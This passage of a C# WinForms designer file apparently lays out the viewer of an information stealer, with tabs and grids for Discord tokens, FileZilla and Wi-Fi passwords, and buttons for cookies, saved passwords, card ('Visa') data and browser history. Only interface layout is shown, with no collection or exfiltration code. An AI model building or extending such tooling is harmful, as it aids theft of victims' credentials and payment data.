        this.ListDiscord.TabIndex = 666;
        this.ListDiscord.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListDiscord.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListDiscord.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListDiscord.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListDiscord.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListDiscord.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListDiscord.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListDiscord.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListDiscord.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListDiscord.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListDiscord.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListDiscord.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListDiscord.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListDiscord.ThemeStyle.HeaderStyle.Height = 30;
        this.ListDiscord.ThemeStyle.ReadOnly = true;
        this.ListDiscord.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListDiscord.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListDiscord.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListDiscord.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListDiscord.ThemeStyle.RowsStyle.Height = 22;
        this.ListDiscord.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListDiscord.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn7.HeaderText = "";
        this.dataGridViewImageColumn7.Name = "dataGridViewImageColumn7";
        this.dataGridViewImageColumn7.ReadOnly = true;
        this.dataGridViewImageColumn7.Width = 5;
        this.dataGridViewTextBoxColumn19.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn19.HeaderText = "Token";
        this.dataGridViewTextBoxColumn19.Name = "dataGridViewTextBoxColumn19";
        this.dataGridViewTextBoxColumn19.ReadOnly = true;
        this.ContexDiscord.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexDiscord.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.RefreshListDiscord, this.SaveListDiscord });
        this.ContexDiscord.Name = "contextMenuStrip1";
        this.ContexDiscord.Size = new System.Drawing.Size(118, 56);
        this.RefreshListDiscord.BackColor = System.Drawing.Color.White;
        this.RefreshListDiscord.Image = (System.Drawing.Image)resources.GetObject("RefreshListDiscord.Image");
        this.RefreshListDiscord.Name = "RefreshListDiscord";
        this.RefreshListDiscord.Size = new System.Drawing.Size(117, 26);
        this.RefreshListDiscord.Text = "Refresh";
        this.RefreshListDiscord.Click += new System.EventHandler(RefreshListDiscord_Click);
        this.SaveListDiscord.BackColor = System.Drawing.Color.White;
        this.SaveListDiscord.Image = (System.Drawing.Image)resources.GetObject("SaveListDiscord.Image");
        this.SaveListDiscord.Name = "SaveListDiscord";
        this.SaveListDiscord.Size = new System.Drawing.Size(117, 26);
        this.SaveListDiscord.Text = "Save";
        this.SaveListDiscord.Click += new System.EventHandler(SaveListDiscord_Click);
        this.PageFileZilla.Controls.Add(this.ListFilezilla);
        this.PageFileZilla.Location = new System.Drawing.Point(4, 4);
        this.PageFileZilla.Name = "PageFileZilla";
        this.PageFileZilla.Size = new System.Drawing.Size(698, 379);
        this.PageFileZilla.TabIndex = 8;
        this.PageFileZilla.Text = "FileZilla";
        this.PageFileZilla.UseVisualStyleBackColor = true;
        this.ListFilezilla.AllowUserToAddRows = false;
        this.ListFilezilla.AllowUserToDeleteRows = false;
        this.ListFilezilla.AllowUserToResizeColumns = false;
        this.ListFilezilla.AllowUserToResizeRows = false;
        dataGridViewCellStyle28.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListFilezilla.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle28;
        this.ListFilezilla.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListFilezilla.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListFilezilla.BackgroundColor = System.Drawing.Color.White;
        this.ListFilezilla.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListFilezilla.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListFilezilla.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListFilezilla.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle29.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle29.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle29.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle29.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle29.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle29.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle29.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListFilezilla.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle29;
        this.ListFilezilla.ColumnHeadersHeight = 30;
        this.ListFilezilla.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListFilezilla.Columns.AddRange(this.dataGridViewImageColumn8, this.dataGridViewTextBoxColumn20, this.dataGridViewTextBoxColumn21, this.dataGridViewTextBoxColumn22, this.dataGridViewTextBoxColumn23);
        this.ListFilezilla.ContextMenuStrip = this.ContexListFileZilla;
        dataGridViewCellStyle30.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle30.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle30.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle30.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle30.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle30.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle30.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListFilezilla.DefaultCellStyle = dataGridViewCellStyle30;
        this.ListFilezilla.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListFilezilla.EnableHeadersVisualStyles = false;
        this.ListFilezilla.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListFilezilla.Location = new System.Drawing.Point(0, 0);
        this.ListFilezilla.Name = "ListFilezilla";
        this.ListFilezilla.ReadOnly = true;
        this.ListFilezilla.RowHeadersVisible = false;
        this.ListFilezilla.RowHeadersWidth = 27;
        this.ListFilezilla.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListFilezilla.ShowCellErrors = false;
        this.ListFilezilla.ShowEditingIcon = false;
        this.ListFilezilla.ShowRowErrors = false;
        this.ListFilezilla.Size = new System.Drawing.Size(698, 379);
        this.ListFilezilla.TabIndex = 661;
        this.ListFilezilla.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListFilezilla.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListFilezilla.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListFilezilla.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListFilezilla.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListFilezilla.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListFilezilla.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListFilezilla.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListFilezilla.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListFilezilla.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListFilezilla.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListFilezilla.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListFilezilla.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListFilezilla.ThemeStyle.HeaderStyle.Height = 30;
        this.ListFilezilla.ThemeStyle.ReadOnly = true;
        this.ListFilezilla.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListFilezilla.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListFilezilla.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListFilezilla.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListFilezilla.ThemeStyle.RowsStyle.Height = 22;
        this.ListFilezilla.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListFilezilla.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn8.HeaderText = "";
        this.dataGridViewImageColumn8.Name = "dataGridViewImageColumn8";
        this.dataGridViewImageColumn8.ReadOnly = true;
        this.dataGridViewImageColumn8.Width = 5;
        this.dataGridViewTextBoxColumn20.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn20.HeaderText = "App";
        this.dataGridViewTextBoxColumn20.Name = "dataGridViewTextBoxColumn20";
        this.dataGridViewTextBoxColumn20.ReadOnly = true;
        this.dataGridViewTextBoxColumn20.Width = 57;
        this.dataGridViewTextBoxColumn21.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle31.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn21.DefaultCellStyle = dataGridViewCellStyle31;
        this.dataGridViewTextBoxColumn21.HeaderText = "Username";
        this.dataGridViewTextBoxColumn21.Name = "dataGridViewTextBoxColumn21";
        this.dataGridViewTextBoxColumn21.ReadOnly = true;
        this.dataGridViewTextBoxColumn21.Width = 94;
        this.dataGridViewTextBoxColumn22.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn22.HeaderText = "Password";
        this.dataGridViewTextBoxColumn22.Name = "dataGridViewTextBoxColumn22";
        this.dataGridViewTextBoxColumn22.ReadOnly = true;
        this.dataGridViewTextBoxColumn22.Width = 90;
        this.dataGridViewTextBoxColumn23.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn23.HeaderText = "URL";
        this.dataGridViewTextBoxColumn23.Name = "dataGridViewTextBoxColumn23";
        this.dataGridViewTextBoxColumn23.ReadOnly = true;
        this.ContexListFileZilla.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexListFileZilla.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.RefreshListFileZilla, this.SaveFileZilla });
        this.ContexListFileZilla.Name = "contextMenuStrip1";
        this.ContexListFileZilla.Size = new System.Drawing.Size(118, 56);
        this.RefreshListFileZilla.BackColor = System.Drawing.Color.White;
        this.RefreshListFileZilla.Image = (System.Drawing.Image)resources.GetObject("RefreshListFileZilla.Image");
        this.RefreshListFileZilla.Name = "RefreshListFileZilla";
        this.RefreshListFileZilla.Size = new System.Drawing.Size(117, 26);
        this.RefreshListFileZilla.Text = "Refresh";
        this.RefreshListFileZilla.Click += new System.EventHandler(RefreshListFileZilla_Click);
        this.SaveFileZilla.BackColor = System.Drawing.Color.White;
        this.SaveFileZilla.Image = (System.Drawing.Image)resources.GetObject("SaveFileZilla.Image");
        this.SaveFileZilla.Name = "SaveFileZilla";
        this.SaveFileZilla.Size = new System.Drawing.Size(117, 26);
        this.SaveFileZilla.Text = "Save";
        this.SaveFileZilla.Click += new System.EventHandler(SaveFileZilla_Click);
        this.PageWiFi.Controls.Add(this.ListWifi);
        this.PageWiFi.Location = new System.Drawing.Point(4, 4);
        this.PageWiFi.Name = "PageWiFi";
        this.PageWiFi.Size = new System.Drawing.Size(698, 379);
        this.PageWiFi.TabIndex = 12;
        this.PageWiFi.Text = "WiFi";
        this.PageWiFi.UseVisualStyleBackColor = true;
        this.ListWifi.AllowUserToAddRows = false;
        this.ListWifi.AllowUserToDeleteRows = false;
        this.ListWifi.AllowUserToResizeColumns = false;
        this.ListWifi.AllowUserToResizeRows = false;
        dataGridViewCellStyle32.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListWifi.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle32;
        this.ListWifi.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListWifi.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListWifi.BackgroundColor = System.Drawing.Color.White;
        this.ListWifi.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListWifi.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListWifi.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListWifi.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle33.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle33.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle33.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle33.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle33.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle33.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle33.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListWifi.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle33;
        this.ListWifi.ColumnHeadersHeight = 30;
        this.ListWifi.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListWifi.Columns.AddRange(this.dataGridViewImageColumn9, this.dataGridViewTextBoxColumn24, this.dataGridViewTextBoxColumn25, this.dataGridViewTextBoxColumn26);
        this.ListWifi.ContextMenuStrip = this.ContexListWifi;
        dataGridViewCellStyle34.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle34.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle34.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle34.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle34.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle34.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle34.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListWifi.DefaultCellStyle = dataGridViewCellStyle34;
        this.ListWifi.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListWifi.EnableHeadersVisualStyles = false;
        this.ListWifi.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListWifi.Location = new System.Drawing.Point(0, 0);
        this.ListWifi.Name = "ListWifi";
        this.ListWifi.ReadOnly = true;
        this.ListWifi.RowHeadersVisible = false;
        this.ListWifi.RowHeadersWidth = 27;
        this.ListWifi.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListWifi.ShowCellErrors = false;
        this.ListWifi.ShowEditingIcon = false;
        this.ListWifi.ShowRowErrors = false;
        this.ListWifi.Size = new System.Drawing.Size(698, 379);
        this.ListWifi.TabIndex = 662;
        this.ListWifi.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListWifi.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListWifi.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListWifi.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListWifi.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListWifi.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListWifi.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListWifi.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListWifi.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListWifi.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListWifi.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListWifi.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListWifi.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListWifi.ThemeStyle.HeaderStyle.Height = 30;
        this.ListWifi.ThemeStyle.ReadOnly = true;
        this.ListWifi.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListWifi.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListWifi.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListWifi.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListWifi.ThemeStyle.RowsStyle.Height = 22;
        this.ListWifi.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListWifi.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn9.HeaderText = "";
        this.dataGridViewImageColumn9.Name = "dataGridViewImageColumn9";
        this.dataGridViewImageColumn9.ReadOnly = true;
        this.dataGridViewImageColumn9.Width = 5;
        this.dataGridViewTextBoxColumn24.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        this.dataGridViewTextBoxColumn24.HeaderText = "App";
        this.dataGridViewTextBoxColumn24.Name = "dataGridViewTextBoxColumn24";
        this.dataGridViewTextBoxColumn24.ReadOnly = true;
        this.dataGridViewTextBoxColumn24.Width = 57;
        this.dataGridViewTextBoxColumn25.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        dataGridViewCellStyle35.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        this.dataGridViewTextBoxColumn25.DefaultCellStyle = dataGridViewCellStyle35;
        this.dataGridViewTextBoxColumn25.HeaderText = "Profile";
        this.dataGridViewTextBoxColumn25.Name = "dataGridViewTextBoxColumn25";
        this.dataGridViewTextBoxColumn25.ReadOnly = true;
        this.dataGridViewTextBoxColumn25.Width = 70;
        this.dataGridViewTextBoxColumn26.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn26.HeaderText = "Password";
        this.dataGridViewTextBoxColumn26.Name = "dataGridViewTextBoxColumn26";
        this.dataGridViewTextBoxColumn26.ReadOnly = true;
        this.ContexListWifi.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexListWifi.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.RefreshListWifi, this.SaveWifi });
        this.ContexListWifi.Name = "contextMenuStrip1";
        this.ContexListWifi.Size = new System.Drawing.Size(118, 56);
        this.RefreshListWifi.BackColor = System.Drawing.Color.White;
        this.RefreshListWifi.Image = (System.Drawing.Image)resources.GetObject("RefreshListWifi.Image");
        this.RefreshListWifi.Name = "RefreshListWifi";
        this.RefreshListWifi.Size = new System.Drawing.Size(117, 26);
        this.RefreshListWifi.Text = "Refresh";
        this.RefreshListWifi.Click += new System.EventHandler(RefreshListWifi_Click);
        this.SaveWifi.BackColor = System.Drawing.Color.White;
        this.SaveWifi.Image = (System.Drawing.Image)resources.GetObject("SaveWifi.Image");
        this.SaveWifi.Name = "SaveWifi";
        this.SaveWifi.Size = new System.Drawing.Size(117, 26);
        this.SaveWifi.Text = "Save";
        this.SaveWifi.Click += new System.EventHandler(SaveWifi_Click);
        this.PaneControll.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PaneControll.AutoScroll = true;
        this.PaneControll.Controls.Add(this.ButWifi);
        this.PaneControll.Controls.Add(this.ButDiscord);
        this.PaneControll.Controls.Add(this.ButMarket);
        this.PaneControll.Controls.Add(this.ButFileZaill);
        this.PaneControll.Controls.Add(this.ButHistory);
        this.PaneControll.Controls.Add(this.ButFiles);
        this.PaneControll.Controls.Add(this.ButCookies);
        this.PaneControll.Controls.Add(this.ButPass);
        this.PaneControll.Controls.Add(this.ButVisa);
        this.PaneControll.Location = new System.Drawing.Point(16, 112);
        this.PaneControll.Name = "PaneControll";
        this.PaneControll.Size = new System.Drawing.Size(45, 405);
        this.PaneControll.TabIndex = 608;
        this.ButWifi.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButWifi.BackColor = System.Drawing.Color.Transparent;
        this.ButWifi.BorderRadius = 10;
        this.ButWifi.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButWifi.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButWifi.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButWifi.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButWifi.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButWifi.CheckedState.Parent = this.ButWifi;
        this.ButWifi.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButWifi.CustomBorderColor = System.Drawing.Color.White;
        this.ButWifi.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButWifi.CustomImages.CheckedImage");
        this.ButWifi.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButWifi.CustomImages.HoveredImage");
        this.ButWifi.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButWifi.CustomImages.Image");
        this.ButWifi.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButWifi.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButWifi.CustomImages.Parent = this.ButWifi;
        this.ButWifi.FillColor = System.Drawing.Color.White;
        this.ButWifi.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButWifi.ForeColor = System.Drawing.Color.White;
        this.ButWifi.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButWifi.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButWifi.HoverState.FillColor = System.Drawing.Color.White;
        this.ButWifi.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButWifi.HoverState.Parent = this.ButWifi;
        this.ButWifi.ImageSize = new System.Drawing.Size(27, 27);
        this.ButWifi.Location = new System.Drawing.Point(3, 360);
        this.ButWifi.Name = "ButWifi";
        this.ButWifi.PressedColor = System.Drawing.Color.White;
        this.ButWifi.ShadowDecoration.Parent = this.ButWifi;
        this.ButWifi.Size = new System.Drawing.Size(38, 38);
        this.ButWifi.TabIndex = 28;
        this.ButWifi.UseTransparentBackground = true;
        this.ButWifi.Click += new System.EventHandler(ButWifi_Click);
        this.ButDiscord.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButDiscord.BackColor = System.Drawing.Color.Transparent;
        this.ButDiscord.BorderRadius = 10;
        this.ButDiscord.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButDiscord.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButDiscord.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButDiscord.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButDiscord.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButDiscord.CheckedState.Parent = this.ButDiscord;
        this.ButDiscord.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButDiscord.CustomBorderColor = System.Drawing.Color.White;
        this.ButDiscord.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButDiscord.CustomImages.CheckedImage");
        this.ButDiscord.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButDiscord.CustomImages.HoveredImage");
        this.ButDiscord.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButDiscord.CustomImages.Image");
        this.ButDiscord.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButDiscord.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButDiscord.CustomImages.Parent = this.ButDiscord;
        this.ButDiscord.FillColor = System.Drawing.Color.White;
        this.ButDiscord.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButDiscord.ForeColor = System.Drawing.Color.White;
        this.ButDiscord.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButDiscord.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButDiscord.HoverState.FillColor = System.Drawing.Color.White;
        this.ButDiscord.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButDiscord.HoverState.Parent = this.ButDiscord;
        this.ButDiscord.ImageSize = new System.Drawing.Size(27, 27);
        this.ButDiscord.Location = new System.Drawing.Point(3, 272);
        this.ButDiscord.Name = "ButDiscord";
        this.ButDiscord.PressedColor = System.Drawing.Color.White;
        this.ButDiscord.ShadowDecoration.Parent = this.ButDiscord;
        this.ButDiscord.Size = new System.Drawing.Size(38, 38);
        this.ButDiscord.TabIndex = 26;
        this.ButDiscord.UseTransparentBackground = true;
        this.ButDiscord.Click += new System.EventHandler(ButDiscord_Click);
        this.ButMarket.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButMarket.BackColor = System.Drawing.Color.Transparent;
        this.ButMarket.BorderRadius = 10;
        this.ButMarket.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
        this.ButMarket.CheckedState.BorderColor = System.Drawing.Color.White;
        this.ButMarket.CheckedState.CustomBorderColor = System.Drawing.Color.White;
        this.ButMarket.CheckedState.FillColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButMarket.CheckedState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButMarket.CheckedState.Parent = this.ButMarket;
        this.ButMarket.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButMarket.CustomBorderColor = System.Drawing.Color.White;
        this.ButMarket.CustomImages.CheckedImage = (System.Drawing.Image)resources.GetObject("ButMarket.CustomImages.CheckedImage");
        this.ButMarket.CustomImages.HoveredImage = (System.Drawing.Image)resources.GetObject("ButMarket.CustomImages.HoveredImage");
        this.ButMarket.CustomImages.Image = (System.Drawing.Image)resources.GetObject("ButMarket.CustomImages.Image");
        this.ButMarket.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.ButMarket.CustomImages.ImageSize = new System.Drawing.Size(24, 24);
        this.ButMarket.CustomImages.Parent = this.ButMarket;
        this.ButMarket.FillColor = System.Drawing.Color.White;
        this.ButMarket.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButMarket.ForeColor = System.Drawing.Color.White;
        this.ButMarket.HoverState.BorderColor = System.Drawing.Color.White;
        this.ButMarket.HoverState.CustomBorderColor = System.Drawing.Color.White;
        this.ButMarket.HoverState.FillColor = System.Drawing.Color.White;
        this.ButMarket.HoverState.ForeColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButMarket.HoverState.Parent = this.ButMarket;
        this.ButMarket.ImageSize = new System.Drawing.Size(27, 27);
        this.ButMarket.Location = new System.Drawing.Point(3, 228);
        this.ButMarket.Name = "ButMarket";
        this.ButMarket.PressedColor = System.Drawing.Color.White;
        this.ButMarket.ShadowDecoration.Parent = this.ButMarket;
        this.ButMarket.Size = new System.Drawing.Size(38, 38);
        this.ButMarket.TabIndex = 25;
        this.ButMarket.UseTransparentBackground = true;
        this.ButMarket.Click += new System.EventHandler(ButMarket_Click);
        this.ButFileZaill.Anchor = System.Windows.Forms.AnchorStyles.Left;
        this.ButFileZaill.BackColor = System.Drawing.Color.Transparent;
        this.ButFileZaill.BorderRadius = 10;
        this.ButFileZaill.ButtonMode = Guna.UI2.WinForms.Enums.ButtonMode.RadioButton;
